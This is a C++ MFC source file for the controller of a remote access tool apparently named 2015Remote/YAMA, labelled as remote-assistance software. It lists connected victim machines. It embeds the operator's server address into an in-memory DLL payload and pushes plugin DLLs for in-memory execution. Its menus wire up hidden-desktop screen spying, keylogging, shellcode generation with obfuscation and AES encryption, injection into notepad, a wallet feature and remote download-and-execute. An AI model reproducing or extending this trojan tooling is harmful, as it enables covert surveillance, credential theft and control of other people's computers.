
// 2015RemoteDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "2015RemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "IOCPServer.h"
#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "TalkDlg.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "AudioDlg.h"
#include "RegisterDlg.h"
#include "ServicesDlg.h"
#include "VideoDlg.h"
#include <vector>
#include "KeyBoardDlg.h"
#include "InputDlg.h"
#include "CPasswordDlg.h"
#include "pwd_gen.h"
#include "common/location.h"
#include <proxy/ProxyMapDlg.h>
#include "DateVerify.h"
#include <fstream>
#include "common/skCrypter.h"
#include "common/commands.h"
#include "common/md5.h"
#include <algorithm>
#include "HideScreenSpyDlg.h"
#include <sys/MachineDlg.h>
#include "Chat.h"
#include "DecryptDlg.h"
#include "adapter.h"
#include "client/MemoryModule.h"
#include <file/CFileManagerDlg.h>
#include "CDrawingBoard.h"
#include "CWalletDlg.h"
#include <wallet.h>
#include "CRcEditDlg.h"
#include <thread>
#include "common/file_upload.h"
#include "SplashDlg.h"
#include <ServerServiceWrapper.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define UM_ICONNOTIFY WM_USER+100
#define TIMER_CHECK 1
#define TIMER_CLOSEWND 2
#define TIMER_CLEAR_BALLOON 3
#define TODO_NOTICE MessageBoxA("This feature has not been implemented!\nPlease contact: 962914132@qq.com", "提示", MB_ICONINFORMATION);
#define TINY_DLL_NAME "TinyRun.dll"
#define FRPC_DLL_NAME "Frpc.dll"

typedef struct {
    const char*   szTitle;     //列表的名称
    int		nWidth;            //列表的宽度
} COLUMNSTRUCT;

const int  g_Column_Count_Online  = ONLINELIST_MAX; // 报表的列数

COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] = {
    {"IP",				130	},
    {"端口",			60	},
    {"地理位置",		130	},
    {"计算机名/备注",	150	},
    {"操作系统",		120	},
    {"CPU",				80	},
    {"摄像头",			70	},
    {"RTT",				70	},
    {"版本",			90	},
    {"安装时间",        120 },
    {"活动窗口",		140 },
    {"类型",			50 },
};

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

const int g_Column_Count_Message = 3;   // 列表的个数

COLUMNSTRUCT g_Column_Data_Message[g_Column_Count_Message] = {
    {"信息类型",		200	},
    {"时间",			200	},
    {"信息内容",	    490	}
};

int g_Column_Online_Width  = 0;
int g_Column_Message_Width = 0;

CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;

static UINT Indicators[] = {
    IDR_STATUSBAR_STRING
};

std::string EventName()
{
    char eventName[64];
    snprintf(eventName, sizeof(eventName), "EVENT_%d", GetCurrentProcessId());
    return eventName;
}
std::string PluginPath()
{
    char path[_MAX_PATH];
    GetModuleFileNameA(NULL, path, _MAX_PATH);
    GET_FILEPATH(path, "Plugins");
    return path;
}


//////////////////////////////////////////////////////////////////////////

// 保存 unordered_map 到文件
void SaveToFile(const ComputerNoteMap& data, const std::string& filename)
{
    std::ofstream outFile(filename, std::ios::binary);  // 打开文件（以二进制模式）
    if (outFile.is_open()) {
        for (const auto& pair : data) {
            outFile.write(reinterpret_cast<const char*>(&pair.first), sizeof(ClientKey));  // 保存 key
            int valueSize = pair.second.GetLength();
            outFile.write(reinterpret_cast<const char*>(&valueSize), sizeof(int));  // 保存 value 的大小
            outFile.write((char*)&pair.second, valueSize);  // 保存 value 字符串
        }
        outFile.close();
    } else {
        Mprintf("Unable to open file '%s' for writing!\n", filename.c_str());
    }
}

// 从文件读取 unordered_map 数据
void LoadFromFile(ComputerNoteMap& data, const std::string& filename)
{
    std::ifstream inFile(filename, std::ios::binary);  // 打开文件（以二进制模式）
    if (inFile.is_open()) {
        while (inFile.peek() != EOF) {
            ClientKey key;
            inFile.read(reinterpret_cast<char*>(&key), sizeof(ClientKey));  // 读取 key

            int valueSize;
            inFile.read(reinterpret_cast<char*>(&valueSize), sizeof(int));  // 读取 value 的大小

            ClientValue value;
            inFile.read((char*)&value, valueSize);  // 读取 value 字符串

            data[key] = value;  // 插入到 map 中
        }
        inFile.close();
    } else {
        Mprintf("Unable to open file '%s' for reading!\n", filename.c_str());
    }
}

//////////////////////////////////////////////////////////////////////////

class CAboutDlg : public CDialogEx
{
public:
    CAboutDlg();

    // 对话框数据
    enum { IDD = IDD_ABOUTBOX };

protected:
    virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

    // 实现
protected:
    DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMy2015RemoteDlg 对话框

std::string GetDbPath()
{
    static char path[MAX_PATH], *name = "YAMA.db";
    static std::string ret = (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path)) ? "." : path)
                             + std::string("\\YAMA\\");
    static BOOL ok = CreateDirectoryA(ret.c_str(), NULL);
    static std::string dbPath = ret + name;
    return dbPath;
}

std::string GetFrpSettingsPath()
{
#ifdef _DEBUG
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    GET_FILEPATH(path, "frpc.ini");
    return path;
#else
    static char path[MAX_PATH], * name = "frpc.ini";
    static std::string ret = (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path)) ? "." : path)
                             + std::string("\\YAMA\\");
    static BOOL ok = CreateDirectoryA(ret.c_str(), NULL);
    static std::string p = ret + name;
    return p;
#endif
}

std::string GetFileName(const char* filepath)
{
    const char* slash1 = strrchr(filepath, '/');
    const char* slash2 = strrchr(filepath, '\\');
    const char* slash = slash1 > slash2 ? slash1 : slash2;
    return slash ? slash + 1 : filepath;
}

bool IsDll64Bit(BYTE* dllBase)
{
    if (!dllBase) return false;

    auto dos = (IMAGE_DOS_HEADER*)dllBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        Mprintf("Invalid DOS header\n");
        return false;
    }

    auto nt = (IMAGE_NT_HEADERS*)(dllBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        Mprintf("Invalid NT header\n");
        return false;
    }

    WORD magic = nt->OptionalHeader.Magic;
    return magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
}

// 返回：读取的字节数组指针（需要手动释放）
DllInfo* ReadPluginDll(const std::string& filename, const DllExecuteInfo & execInfo = { MEMORYDLL, 0, CALLTYPE_IOCPTHREAD })
{
    // 打开文件（以二进制模式）
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    std::string name = GetFileName(filename.c_str());
    if (!file.is_open() || name.length() >= 32) {
        Mprintf("无法打开文件: %s\n", filename.c_str());
        return nullptr;
    }

    // 获取文件大小
    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    // 分配缓冲区: CMD + DllExecuteInfo + size
    BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfo) + fileSize];
    BYTE* dllData = buffer + 1 + sizeof(DllExecuteInfo);
    if (!file.read(reinterpret_cast<char*>(dllData), fileSize)) {
        Mprintf("读取文件失败: %s\n", filename.c_str());
        delete[] buffer;
        return nullptr;
    }
    std::string masterHash(GetMasterHash());
    int offset = MemoryFind((char*)dllData, masterHash.c_str(), fileSize, masterHash.length());
    if (offset != -1) {
        std::string masterId = GetPwdHash(), hmac = GetHMAC();

        memcpy((char*)dllData + offset, masterId.c_str(), masterId.length());
        memcpy((char*)dllData + offset + masterId.length(), hmac.c_str(), hmac.length());
    }

    // 设置输出参数
    auto md5 = CalcMD5FromBytes(dllData, fileSize);
    DllExecuteInfo info = execInfo;
    info.Size = fileSize;
    info.Is32Bit = !IsDll64Bit(dllData);
    memcpy(info.Name, name.c_str(), name.length());
    memcpy(info.Md5, md5.c_str(), md5.length());
    buffer[0] = CMD_EXECUTE_DLL;
    memcpy(buffer + 1, &info, sizeof(DllExecuteInfo));
    Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize, 0, md5);
    SAFE_DELETE_ARRAY(buffer);
    return new DllInfo{ name, buf };
}

DllInfo* ReadTinyRunDll(int pid)
{
    std::string name = TINY_DLL_NAME;
    DWORD fileSize = 0;
    BYTE * dllData = ReadResource(IDR_TINYRUN_X64, fileSize);
    std::string s(skCrypt(FLAG_FINDEN)), ip, port;
    int offset = MemoryFind((char*)dllData, s.c_str(), fileSize, s.length());
    if (offset != -1) {
        std::string ip = THIS_CFG.GetStr("settings", "master", "");
        int nPort = THIS_CFG.Get1Int("settings", "ghost", ';', 6543);
        std::string master = ip.empty() ? "" : ip + ":" + std::to_string(nPort);
        CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(dllData + offset);
        if (!master.empty()) {
            splitIpPort(master, ip, port);
            server->SetServer(ip.c_str(), atoi(port.c_str()));
            server->SetAdminId(GetMasterHash().c_str());
            server->iType = CLIENT_TYPE_MEMDLL;
            server->parentHwnd = g_2015RemoteDlg ? (uint64_t)g_2015RemoteDlg->GetSafeHwnd() : 0;
            memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
        }
    }
    // 设置输出参数
    auto md5 = CalcMD5FromBytes(dllData, fileSize);
    DllExecuteInfo info = { SHELLCODE, fileSize, CALLTYPE_DEFAULT, {}, {}, pid };
    memcpy(info.Name, name.c_str(), name.length());
    memcpy(info.Md5, md5.c_str(), md5.length());
    BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfo) + fileSize];
    buffer[0] = CMD_EXECUTE_DLL;
    memcpy(buffer + 1, &info, sizeof(DllExecuteInfo));
    memcpy(buffer + 1 + sizeof(DllExecuteInfo), dllData, fileSize);
    Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize, 0, md5);
    SAFE_DELETE_ARRAY(dllData);
    SAFE_DELETE_ARRAY(buffer);
    return new DllInfo{ name, buf };
}

DllInfo* ReadFrpcDll()
{
	std::string name = FRPC_DLL_NAME;
	DWORD fileSize = 0;
	BYTE* dllData = ReadResource(IDR_BINARY_FRPC, fileSize);
	// 设置输出参数
	auto md5 = CalcMD5FromBytes(dllData, fileSize);
	DllExecuteInfoNew info = { MEMORYDLL, fileSize, CALLTYPE_FRPC_CALL };
	memcpy(info.Name, name.c_str(), name.length());
	memcpy(info.Md5, md5.c_str(), md5.length());
	BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfoNew) + fileSize];
	buffer[0] = CMD_EXECUTE_DLL_NEW;
	memcpy(buffer + 1, &info, sizeof(DllExecuteInfoNew));
	memcpy(buffer + 1 + sizeof(DllExecuteInfoNew), dllData, fileSize);
	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfoNew) + fileSize, 0, md5);
	SAFE_DELETE_ARRAY(dllData);
	SAFE_DELETE_ARRAY(buffer);
	return new DllInfo{ name, buf };
}

std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath)
{
    std::vector<DllInfo*> result;

    std::string searchPath = dirPath + "\\*.dll";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        Mprintf("无法打开目录: %s\n", dirPath.c_str());
        return result;
    }

    do {
        if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::string fullPath = dirPath + "\\" + findData.cFileName;
            DllInfo* dll = ReadPluginDll(fullPath.c_str());
            if (dll) {
                result.push_back(dll);
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
    return result;
}

std::string GetParentDir()
{
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    std::string path(exePath);

    // 找到最后一个反斜杠，得到程序目录
    size_t pos = path.find_last_of("\\/");
    if (pos != std::string::npos) {
        path = path.substr(0, pos); // 程序目录
    }

    // 再往上一级
    pos = path.find_last_of("\\/");
    if (pos != std::string::npos) {
        path = path.substr(0, pos);
    }

    return path;
}

std::string CMy2015RemoteDlg::GetHardwareID(int v)
{
    int version = v == -1 ? THIS_CFG.GetInt("settings", "BindType", 0) : v;
    switch (version) {
    case 0:
        return getHardwareID();
    case 1: {
        std::string master = THIS_CFG.GetStr("settings", "master");
        if (!master.empty()) return master;
        IPConverter cvt;
        std::string id = cvt.getPublicIP();
        return id;
    }
    default:
        return "";
    }
}

CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
{
    g_StartTick = GetTickCount();
    auto s = GetMasterHash();
    char buf[17] = { 0 };
    std::strncpy(buf, s.c_str(), 16);
    m_superID = std::strtoull(buf, NULL, 16);

    m_nMaxConnection = 2;
    m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
    m_hIcon = THIS_APP->LoadIcon(IDR_MAINFRAME);

    m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
    m_bmOnline[1].LoadBitmap(IDB_BITMAP_UPDATE);
    m_bmOnline[2].LoadBitmap(IDB_BITMAP_DELETE);
    m_bmOnline[3].LoadBitmap(IDB_BITMAP_SHARE);
    m_bmOnline[4].LoadBitmap(IDB_BITMAP_PROXY);
    m_bmOnline[5].LoadBitmap(IDB_BITMAP_HOSTNOTE);
    m_bmOnline[6].LoadBitmap(IDB_BITMAP_VDESKTOP);
    m_bmOnline[7].LoadBitmap(IDB_BITMAP_GDESKTOP);
    m_bmOnline[8].LoadBitmap(IDB_BITMAP_DDESKTOP);
    m_bmOnline[9].LoadBitmap(IDB_BITMAP_SDESKTOP);
    m_bmOnline[10].LoadBitmap(IDB_BITMAP_AUTHORIZE);
    m_bmOnline[11].LoadBitmap(IDB_BITMAP_UNAUTH);
    m_bmOnline[12].LoadBitmap(IDB_BITMAP_ASSIGNTO);
    m_bmOnline[13].LoadBitmap(IDB_BITMAP_ADDWATCH);
    m_bmOnline[14].LoadBitmap(IDB_BITMAP_ADMINRUN);
    m_bmOnline[15].LoadBitmap(IDB_BITMAP_UNINSTALL);
    m_bmOnline[16].LoadBitmap(IDB_BITMAP_PDESKTOP);
    m_bmOnline[17].LoadBitmap(IDB_BITMAP_REGROUP);
    m_bmOnline[18].LoadBitmap(IDB_BITMAP_INJECT);
    m_bmOnline[19].LoadBitmap(IDB_BITMAP_PORTPROXY);

    for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
        m_ServerDLL[i] = nullptr;
        m_ServerBin[i] = nullptr;
    }

    InitializeCriticalSection(&m_cs);

    // Init DLL list
    char path[_MAX_PATH];
    GetModuleFileNameA(NULL, path, _MAX_PATH);
    GET_FILEPATH(path, "Plugins");
    m_DllList = ReadAllDllFilesWindows(path);
    m_tinyDLL = NULL;
    auto dlls = ReadAllDllFilesWindows(GetParentDir() + "\\Plugins");
    m_DllList.insert(m_DllList.end(), dlls.begin(), dlls.end());
    m_TraceTime= THIS_CFG.GetInt("settings", "TraceTime", 1000);
}


CMy2015RemoteDlg::~CMy2015RemoteDlg()
{
    DeleteCriticalSection(&m_cs);
    for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
        SAFE_DELETE(m_ServerDLL[i]);
        SAFE_DELETE(m_ServerBin[i]);
    }
    for (int i = 0; i < m_DllList.size(); i++) {
        SAFE_DELETE(m_DllList[i]);
    }
    if (m_tinyDLL) {
        MemoryFreeLibrary(m_tinyDLL);
        m_tinyDLL = NULL;
    }
}

void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialogEx::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
    DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
    DDX_Control(pDX, IDC_GROUP_TAB, m_GroupTab);
}

BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
    ON_WM_SYSCOMMAND()
    ON_WM_PAINT()
    ON_WM_QUERYDRAGICON()
    ON_WM_SIZE()
    ON_WM_TIMER()
    ON_WM_CLOSE()
    ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMy2015RemoteDlg::OnNMRClickOnline)
    ON_NOTIFY(HDN_ITEMCLICK, 0, &CMy2015RemoteDlg::OnHdnItemclickList)
    ON_COMMAND(ID_ONLINE_MESSAGE, &CMy2015RemoteDlg::OnOnlineMessage)
    ON_COMMAND(ID_ONLINE_DELETE, &CMy2015RemoteDlg::OnOnlineDelete)
    ON_COMMAND(ID_ONLINE_UPDATE, &CMy2015RemoteDlg::OnOnlineUpdate)
    ON_COMMAND(IDM_ONLINE_ABOUT, &CMy2015RemoteDlg::OnAbout)
    ON_COMMAND(ID_HELP, &CMy2015RemoteDlg::OnAbout)

    ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
    ON_COMMAND(IDM_ONLINE_PROCESS, &CMy2015RemoteDlg::OnOnlineProcessManager)
    ON_COMMAND(IDM_ONLINE_WINDOW, &CMy2015RemoteDlg::OnOnlineWindowManager)
    ON_COMMAND(IDM_ONLINE_DESKTOP, &CMy2015RemoteDlg::OnOnlineDesktopManager)
    ON_COMMAND(IDM_ONLINE_FILE, &CMy2015RemoteDlg::OnOnlineFileManager)
    ON_COMMAND(IDM_ONLINE_AUDIO, &CMy2015RemoteDlg::OnOnlineAudioManager)
    ON_COMMAND(IDM_ONLINE_VIDEO, &CMy2015RemoteDlg::OnOnlineVideoManager)
    ON_COMMAND(IDM_ONLINE_SERVER, &CMy2015RemoteDlg::OnOnlineServerManager)
    ON_COMMAND(IDM_ONLINE_REGISTER, &CMy2015RemoteDlg::OnOnlineRegisterManager)
    ON_COMMAND(IDM_KEYBOARD, &CMy2015RemoteDlg::OnOnlineKeyboardManager)
    ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //生成Client
    ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconNotify)
    ON_COMMAND(IDM_NOTIFY_SHOW, &CMy2015RemoteDlg::OnNotifyShow)
    ON_COMMAND(ID_NOTIFY_EXIT, &CMy2015RemoteDlg::OnNotifyExit)
    ON_COMMAND(ID_MAIN_SET, &CMy2015RemoteDlg::OnMainSet)
    ON_COMMAND(ID_MAIN_EXIT, &CMy2015RemoteDlg::OnMainExit)
    ON_MESSAGE(WM_USERTOONLINELIST, OnUserToOnlineList)
    ON_MESSAGE(WM_USEROFFLINEMSG, OnUserOfflineMsg)
    ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
    ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, OnOpenFileManagerDialog)
    ON_MESSAGE(WM_OPENTALKDIALOG, OnOpenTalkDialog)
    ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
    ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
    ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
    ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
    ON_MESSAGE(WM_OPENREGISTERDIALOG, OnOpenRegisterDialog)
    ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
    ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
    ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyboardDialog)
    ON_MESSAGE(WM_OPENPROXYDIALOG, OnOpenProxyDialog)
    ON_MESSAGE(WM_OPENHIDESCREENDLG, OnOpenHideScreenDialog)
    ON_MESSAGE(WM_OPENMACHINEMGRDLG, OnOpenMachineManagerDialog)
    ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)
    ON_MESSAGE(WM_OPENDECRYPTDIALOG, OnOpenDecryptDialog)
    ON_MESSAGE(WM_OPENFILEMGRDIALOG, OnOpenFileMgrDialog)
    ON_MESSAGE(WM_OPENDRAWINGBOARD, OnOpenDrawingBoard)
    ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
    ON_MESSAGE(WM_PASSWORDCHECK, OnPasswordCheck)
    ON_MESSAGE(WM_SHOWMESSAGE, OnShowMessage)
    ON_MESSAGE(WM_SHOWNOTIFY, OnShowNotify)
    ON_MESSAGE(WM_SHOWERRORMSG, OnShowErrMessage)
    ON_MESSAGE(WM_INJECT_SHELLCODE, InjectShellcode)
    ON_MESSAGE(WM_ANTI_BLACKSCREEN, AntiBlackScreen)
    ON_MESSAGE(WM_SHARE_CLIENT, ShareClient)
    ON_MESSAGE(WM_ASSIGN_CLIENT, AssignClient)
    ON_MESSAGE(WM_ASSIGN_ALLCLIENT, AssignAllClient)
    ON_MESSAGE(WM_UPDATE_ACTIVEWND, UpdateUserEvent)
    ON_WM_HELPINFO()
    ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
    ON_COMMAND(ID_TOOL_AUTH, &CMy2015RemoteDlg::OnToolAuth)
    ON_COMMAND(ID_TOOL_GEN_MASTER, &CMy2015RemoteDlg::OnToolGenMaster)
    ON_COMMAND(ID_MAIN_PROXY, &CMy2015RemoteDlg::OnMainProxy)
    ON_COMMAND(ID_ONLINE_HOSTNOTE, &CMy2015RemoteDlg::OnOnlineHostnote)
    ON_COMMAND(ID_HELP_IMPORTANT, &CMy2015RemoteDlg::OnHelpImportant)
    ON_COMMAND(ID_HELP_FEEDBACK, &CMy2015RemoteDlg::OnHelpFeedback)
    // 将所有动态子菜单项的命令 ID 映射到同一个响应函数
    ON_COMMAND_RANGE(ID_DYNAMIC_MENU_BASE, ID_DYNAMIC_MENU_BASE + 20, &CMy2015RemoteDlg::OnDynamicSubMenu)
    ON_COMMAND(ID_ONLINE_VIRTUAL_DESKTOP, &CMy2015RemoteDlg::OnOnlineVirtualDesktop)
    ON_COMMAND(ID_ONLINE_GRAY_DESKTOP, &CMy2015RemoteDlg::OnOnlineGrayDesktop)
    ON_COMMAND(ID_ONLINE_REMOTE_DESKTOP, &CMy2015RemoteDlg::OnOnlineRemoteDesktop)
    ON_COMMAND(ID_ONLINE_H264_DESKTOP, &CMy2015RemoteDlg::OnOnlineH264Desktop)
    ON_COMMAND(ID_WHAT_IS_THIS, &CMy2015RemoteDlg::OnWhatIsThis)
    ON_COMMAND(ID_ONLINE_AUTHORIZE, &CMy2015RemoteDlg::OnOnlineAuthorize)
    ON_NOTIFY(NM_DBLCLK, IDC_ONLINE, &CMy2015RemoteDlg::OnListClick)
    ON_COMMAND(ID_ONLINE_UNAUTHORIZE, &CMy2015RemoteDlg::OnOnlineUnauthorize)
    ON_COMMAND(ID_TOOL_REQUEST_AUTH, &CMy2015RemoteDlg::OnToolRequestAuth)
    ON_COMMAND(ID_TOOL_INPUT_PASSWORD, &CMy2015RemoteDlg::OnToolInputPassword)
    ON_COMMAND(ID_TOOL_GEN_SHELLCODE, &CMy2015RemoteDlg::OnToolGenShellcode)
    ON_COMMAND(ID_ONLINE_ASSIGN_TO, &CMy2015RemoteDlg::OnOnlineAssignTo)
    ON_NOTIFY(NM_CUSTOMDRAW, IDC_MESSAGE, &CMy2015RemoteDlg::OnNMCustomdrawMessage)
    ON_COMMAND(ID_ONLINE_ADD_WATCH, &CMy2015RemoteDlg::OnOnlineAddWatch)
    ON_NOTIFY(NM_CUSTOMDRAW, IDC_ONLINE, &CMy2015RemoteDlg::OnNMCustomdrawOnline)
    ON_COMMAND(ID_ONLINE_RUN_AS_ADMIN, &CMy2015RemoteDlg::OnOnlineRunAsAdmin)
    ON_COMMAND(ID_MAIN_WALLET, &CMy2015RemoteDlg::OnMainWallet)
    ON_COMMAND(ID_TOOL_RCEDIT, &CMy2015RemoteDlg::OnToolRcedit)
    ON_COMMAND(ID_ONLINE_UNINSTALL, &CMy2015RemoteDlg::OnOnlineUninstall)
    ON_COMMAND(ID_ONLINE_PRIVATE_SCREEN, &CMy2015RemoteDlg::OnOnlinePrivateScreen)
    ON_NOTIFY(TCN_SELCHANGE, IDC_GROUP_TAB, &CMy2015RemoteDlg::OnSelchangeGroupTab)
    ON_COMMAND(ID_OBFS_SHELLCODE, &CMy2015RemoteDlg::OnObfsShellcode)
    ON_COMMAND(ID_ONLINE_REGROUP, &CMy2015RemoteDlg::OnOnlineRegroup)
    ON_COMMAND(ID_MACHINE_SHUTDOWN, &CMy2015RemoteDlg::OnMachineShutdown)
    ON_COMMAND(ID_MACHINE_REBOOT, &CMy2015RemoteDlg::OnMachineReboot)
    ON_COMMAND(ID_EXECUTE_DOWNLOAD, &CMy2015RemoteDlg::OnExecuteDownload)
    ON_COMMAND(ID_EXECUTE_UPLOAD, &CMy2015RemoteDlg::OnExecuteUpload)
    ON_COMMAND(ID_MACHINE_LOGOUT, &CMy2015RemoteDlg::OnMachineLogout)
    ON_WM_DESTROY()
    ON_MESSAGE(WM_SESSION_ACTIVATED, &CMy2015RemoteDlg::OnSessionActivatedMsg)
    ON_COMMAND(ID_TOOL_GEN_SHELLCODE_BIN, &CMy2015RemoteDlg::OnToolGenShellcodeBin)
    ON_COMMAND(ID_SHELLCODE_LOAD_TEST, &CMy2015RemoteDlg::OnShellcodeLoadTest)
    ON_COMMAND(ID_SHELLCODE_OBFS_LOAD_TEST, &CMy2015RemoteDlg::OnShellcodeObfsLoadTest)
    ON_COMMAND(ID_OBFS_SHELLCODE_BIN, &CMy2015RemoteDlg::OnObfsShellcodeBin)
    ON_COMMAND(ID_SHELLCODE_AES_BIN, &CMy2015RemoteDlg::OnShellcodeAesBin)
    ON_COMMAND(ID_SHELLCODE_TEST_AES_BIN, &CMy2015RemoteDlg::OnShellcodeTestAesBin)
    ON_COMMAND(ID_TOOL_RELOAD_PLUGINS, &CMy2015RemoteDlg::OnToolReloadPlugins)
    ON_COMMAND(ID_SHELLCODE_AES_C_ARRAY, &CMy2015RemoteDlg::OnShellcodeAesCArray)
    ON_COMMAND(ID_PARAM_KBLOGGER, &CMy2015RemoteDlg::OnParamKblogger)
    ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
    ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
    ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
        ON_COMMAND(ID_PROXY_PORT, &CMy2015RemoteDlg::OnProxyPort)
        ON_COMMAND(ID_HOOK_WIN, &CMy2015RemoteDlg::OnHookWin)
        ON_COMMAND(ID_RUNAS_SERVICE, &CMy2015RemoteDlg::OnRunasService)
        END_MESSAGE_MAP()


// CMy2015RemoteDlg 消息处理程序
void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
{
    switch ((UINT)lParam) {
    case WM_LBUTTONDOWN: {
        if (IsIconic()) {
            ShowWindow(SW_SHOW);
            break;
        }
        ShowWindow(IsWindowVisible() ? SW_HIDE : SW_SHOW);
        SetForegroundWindow();
        break;
    }
    case WM_RBUTTONDOWN: {
        CMenu Menu;
        Menu.LoadMenu(IDR_MENU_NOTIFY);
        CPoint Point;
        GetCursorPos(&Point);
        SetForegroundWindow();   //设置当前窗口
        Menu.GetSubMenu(0)->TrackPopupMenu(
                TPM_LEFTBUTTON|TPM_RIGHTBUTTON,
                Point.x, Point.y, this, NULL);

        break;
    }
    }
}

VOID CMy2015RemoteDlg::CreateSolidMenu()
{
    m_MainMenu.LoadMenu(IDR_MENU_MAIN);
    CMenu* SubMenu = m_MainMenu.GetSubMenu(1);
    std::string masterHash(GetMasterHash());
    if (GetPwdHash() != masterHash) {
        SubMenu->DeleteMenu(ID_TOOL_GEN_MASTER, MF_BYCOMMAND);
    }
    SubMenu = m_MainMenu.GetSubMenu(3);
    if (!THIS_CFG.GetStr("settings", "Password").empty()) {
        SubMenu->ModifyMenuA(ID_TOOL_REQUEST_AUTH, MF_STRING, ID_TOOL_REQUEST_AUTH, _T("序列号"));
    }

    ::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); //为窗口设置菜单
    ::DrawMenuBar(this->GetSafeHwnd());                        //显示菜单
}

VOID CMy2015RemoteDlg::CreatStatusBar()
{
    if (!m_StatusBar.Create(this) ||
        !m_StatusBar.SetIndicators(Indicators,
                                   sizeof(Indicators)/sizeof(UINT))) {                  //创建状态条并设置字符资源的ID
        return ;
    }

    CRect rect;
    GetWindowRect(&rect);
    rect.bottom+=20;
    MoveWindow(rect);
}

VOID CMy2015RemoteDlg::CreateNotifyBar()
{
    m_Nid.uVersion = NOTIFYICON_VERSION_4;
    m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //大小赋值
    m_Nid.hWnd = m_hWnd;           //父窗口    是被定义在父类CWnd类中
    m_Nid.uID = IDR_MAINFRAME;     //icon  ID
    m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态
    m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //回调消息
    m_Nid.hIcon = m_hIcon;                               //icon 变量
    CString strTips ="禁界: 远程协助软件";       //气泡提示
    lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
    Shell_NotifyIcon(NIM_ADD, &m_Nid);   //显示托盘
}

VOID CMy2015RemoteDlg::CreateToolBar()
{
    if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
                            | CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
